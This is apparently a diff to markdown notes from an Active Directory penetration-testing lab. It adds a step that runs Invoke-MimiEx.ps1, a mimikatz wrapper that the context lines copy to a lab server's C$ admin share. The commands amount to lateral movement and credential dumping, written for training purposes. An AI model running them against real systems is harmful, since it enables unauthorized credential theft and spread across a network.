@@ -293,4 +293,7 @@ We cannot use the dot sourcing, so we need to use  a script that run mimikatz by
 ```powershell
 Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files
 ```
+```powershell
+.\Invoke-MimiEx.ps1
+```
 
